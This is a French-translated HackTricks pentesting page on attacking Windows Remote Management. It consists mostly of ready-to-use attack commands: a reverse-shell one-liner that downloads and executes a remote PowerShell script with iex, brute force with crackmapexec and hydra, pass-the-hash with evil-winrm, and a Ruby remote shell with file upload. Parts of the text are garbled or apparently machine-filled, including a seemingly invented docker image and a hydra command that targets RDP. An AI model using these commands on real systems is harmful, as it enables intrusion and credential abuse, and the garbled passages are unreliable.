# 5985,5986 - Pentesting WinRM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore les sensations et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## WinRM

[Windows Remote Management](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) (WinRM) est un protocole Microsoft qui **permet la gestion √† distance des machines Windows** via HTTP(S) en utilisant SOAP. √Ä l'arri√®re-plan, il utilise WMI, vous pouvez donc le consid√©rer comme une API bas√©e sur HTTP pour WMI.

Si WinRM est activ√© sur la machine, il est trivial d'administrer √† distance la machine depuis PowerShell. En fait, vous pouvez simplement vous connecter √† une session PowerShell √† distance sur la machine (comme si vous utilisiez SSH !)

La mani√®re la plus simple de d√©tecter si WinRM est disponible est de v√©rifier si le port est ouvert. WinRM √©coutera sur l'un des deux ports :

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Si l'un de ces ports est ouvert, WinRM est configur√© et vous pouvez essayer d'entrer dans une session √† distance.

## **Initialisation d'une session WinRM**.

Nous pouvons configurer PowerShell pour fonctionner avec WinRM. Selon la documentation Microsoft, Enable-PSRemoting est une cmdlet qui configure l'ordinateur pour recevoir des commandes PowerShell √† distance. Si nous avons acc√®s √† une invite PowerShell √©lev√©e sur la victime, nous pouvons l'activer et ajouter tous les "attaquants" en tant qu'h√¥tes de confiance. Nous pouvons ex√©cuter les deux commandes suivantes :
```
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Cela ajoute un joker √† la configuration trustedhosts. Soyez prudent quant √† ce que cela implique. _Note: J'ai √©galement d√ª changer le type de r√©seau sur ma machine d'attaque de "Public" √† "Work"._

Vous pouvez √©galement **activer** WinRM **√† distance** _\*\*\_en utilisant \_wmic_:
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
### Testez si configur√©

Une fois que la machine d'attaque est configur√©e, utilisez la fonction `Test-WSMan` pour tester si la cible est configur√©e pour WinRM. Vous devriez voir des informations renvoy√©es sur la version du protocole et wsmid :

![](<../.gitbook/assets/image (161) (1).png>)

![](<../.gitbook/assets/image (162).png>)

Dans ce cas, le premier est configur√© et le second ne l'est pas.

### Ex√©cutez une commande

Maintenant, nous pouvons utiliser la commande `Invoke-Command` de PowerShell pour ex√©cuter √† distance une commande sur la cible via WinRM. Pour ex√©cuter √† distance `ipconfig` et voir la sortie :
```
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

Vous pouvez √©galement **ex√©cuter une commande de votre console PS actuelle via** _**Invoke-Command**_. Supposons que vous ayez localement une fonction appel√©e _**enumeration**_ et que vous souhaitez **l'ex√©cuter sur un ordinateur distant**, vous pouvez le faire :
```ruby
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Ex√©cuter un script

To execute a script using WinRM, you can follow these steps:

1. Connect to the target machine using a WinRM client.
2. Use the `Invoke-Command` cmdlet to run the script on the remote machine.

Here is an example of how to execute a script using WinRM:

```powershell
Invoke-Command -ComputerName <target_machine> -ScriptBlock { <script_content> }
```

Replace `<target_machine>` with the IP address or hostname of the target machine, and `<script_content>` with the actual content of your script.

Make sure that the WinRM service is enabled and running on the target machine. You can use the `Test-WSMan` cmdlet to check the connectivity to the target machine.

By executing a script remotely using WinRM, you can automate tasks and perform actions on multiple machines simultaneously. It is a powerful feature that can save time and effort during penetration testing and system administration.
```ruby
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Obtenir un shell invers√©

To get a reverse shell, you need to exploit a vulnerability in the target system and establish a connection back to your machine. This allows you to gain remote access and control over the target system.

Here are the steps to get a reverse shell:

1. Identify a vulnerability: Look for vulnerabilities in the target system that can be exploited to gain remote access. Common vulnerabilities include weak passwords, unpatched software, and misconfigured services.

2. Exploit the vulnerability: Once you have identified a vulnerability, use an exploit to gain control over the target system. This can involve running a malicious script or exploiting a specific vulnerability in a service or application.

3. Set up a listener: On your machine, set up a listener to receive the reverse shell connection. This can be done using tools like Netcat or Metasploit.

4. Establish the reverse shell connection: Once the vulnerability is exploited, the target system will connect back to your machine. This will establish a reverse shell connection, allowing you to interact with the target system's command prompt.

5. Gain remote access: With the reverse shell connection established, you can now execute commands on the target system as if you were physically present. This gives you remote access and control over the target system.

It is important to note that gaining unauthorized access to computer systems is illegal and unethical. The techniques described here should only be used for legitimate purposes, such as penetration testing or securing your own systems.
```ruby
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Obtenir une session PS

Ou, si vous souhaitez acc√©der directement √† une session PowerShell interactive, utilisez la fonction `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**La session s'ex√©cutera dans un nouveau processus (wsmprovhost) √† l'int√©rieur de la "victime"**

### **Forcer l'ouverture de WinRM**

Si vous voulez vraiment utiliser PS Remoting et WinRM mais que la cible n'est pas configur√©e pour cela, vous pouvez "forcer" son activation gr√¢ce √† une seule commande. Je ne recommande pas cela, mais si vous voulez vraiment utiliser WinRM ou PSRemoting, vous pouvez le faire de cette mani√®re. Par exemple, en utilisant PSExec :
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
Maintenant, nous pouvons entrer dans une session PS √† distance sur la victime.

### Sauvegarde et restauration des sessions

Cela **ne fonctionnera pas** si la **langue** est **restreinte** sur l'ordinateur distant.
```ruby
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Dans cette session, vous pouvez charger des scripts PS en utilisant _Invoke-Command_.
```ruby
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Erreurs

Si vous rencontrez l'erreur suivante :

`enter-pssession : La connexion au serveur distant 10.10.10.175 a √©chou√© avec le message d'erreur suivant : Le client WinRM ne peut pas traiter la demande. Si le sch√©ma d'authentification est diff√©rent de Kerberos, ou si l'ordinateur client n'est pas joint √† un domaine, le transport HTTPS doit √™tre utilis√© ou la machine de destination doit √™tre ajout√©e √† la configuration TrustedHosts. Utilisez winrm.cmd pour configurer TrustedHosts. Notez que les ordinateurs de la liste TrustedHosts peuvent ne pas √™tre authentifi√©s. Vous pouvez obtenir plus d'informations √† ce sujet en ex√©cutant la commande suivante : winrm help config. Pour plus d'informations, consultez le sujet d'aide about_Remote_Troubleshooting.`

Essayez ceci sur le client (informations provenant [ici](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)) :
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore les sensations fortes et les d√©fis du piratage.

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage en constante √©volution gr√¢ce √† des actualit√©s et des informations en temps r√©el.

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme.

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Connexion WinRM sous Linux

### Brute Force

Attention, le brute-forcing de WinRM peut bloquer les utilisateurs.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Utilisation d'evil-winrm

Evil-winrm est un outil de pentesting qui permet d'exploiter les vuln√©rabilit√©s du service WinRM (Windows Remote Management) pour acc√©der √† distance √† un syst√®me Windows. Il fournit une interface en ligne de commande pour ex√©cuter des commandes et des scripts sur un h√¥te distant.

Pour utiliser evil-winrm, vous devez d'abord installer Ruby et les d√©pendances n√©cessaires. Ensuite, vous pouvez ex√©cuter la commande suivante pour installer evil-winrm :

```
gem install evil-winrm
```

Une fois install√©, vous pouvez utiliser evil-winrm en sp√©cifiant l'adresse IP ou le nom d'h√¥te de la machine cible, ainsi que les informations d'identification valides pour vous connecter. Voici un exemple de commande :

```
evil-winrm -i <adresse_IP> -u <nom_utilisateur> -p <mot_de_passe>
```

Apr√®s vous √™tre connect√© avec succ√®s, vous pouvez ex√©cuter des commandes sur le syst√®me distant, t√©l√©charger ou t√©l√©verser des fichiers, et m√™me ex√©cuter des scripts PowerShell. Evil-winrm offre √©galement des fonctionnalit√©s avanc√©es telles que l'escalade de privil√®ges et l'ex√©cution de commandes en mode furtif.

Il est important de noter que l'utilisation d'evil-winrm pour acc√©der √† un syst√®me sans autorisation appropri√©e est ill√©gale et constitue une violation de la vie priv√©e. Il est recommand√© de n'utiliser cet outil que dans le cadre d'un test de p√©n√©tration autoris√© et avec le consentement du propri√©taire du syst√®me cible.
```ruby
gem install evil-winrm
```
Lisez la **documentation** sur son github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Pour utiliser evil-winrm pour se connecter √† une **adresse IPv6**, cr√©ez une entr√©e dans le fichier _**/etc/hosts**_ en d√©finissant un **nom de domaine** pour l'adresse IPv6, puis connectez-vous √† ce domaine.

### Transmettre le hash avec evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (173).png>)

### Utilisation d'une machine PS-docker

L'utilisation d'une machine PS-docker est une m√©thode pratique pour effectuer des tests de p√©n√©tration sur les services WinRM. Cette approche permet de cr√©er rapidement une machine virtuelle avec PowerShell pr√©install√© et configur√© pour se connecter √† des services WinRM.

Voici les √©tapes pour utiliser une machine PS-docker :

1. Assurez-vous d'avoir Docker install√© sur votre syst√®me.
2. Ouvrez une fen√™tre de terminal et ex√©cutez la commande suivante pour t√©l√©charger l'image Docker PS-docker :

   ```
   docker pull pentestmonkey/winrm
   ```

3. Une fois l'image t√©l√©charg√©e, ex√©cutez la commande suivante pour d√©marrer une nouvelle instance de la machine PS-docker :

   ```
   docker run -it pentestmonkey/winrm
   ```

4. Vous serez maintenant connect√© √† la machine PS-docker. Vous pouvez utiliser PowerShell pour effectuer des tests de p√©n√©tration sur les services WinRM.

Cette m√©thode est particuli√®rement utile lorsque vous avez besoin d'une machine de test temporaire pour effectuer des tests de p√©n√©tration sur les services WinRM. Une fois que vous avez termin√©, vous pouvez simplement arr√™ter et supprimer l'instance de la machine PS-docker.
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Utilisation d'un script ruby

Code extrait d'ici : [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## R√©f√©rences

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Commandes automatiques HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‚ÄòMySuperSecr3tPass123!‚Äô

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore les sensations fortes et les d√©fis du piratage.

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage en constante √©volution gr√¢ce aux actualit√©s et aux informations en temps r√©el.

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme.

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family).
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com).
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
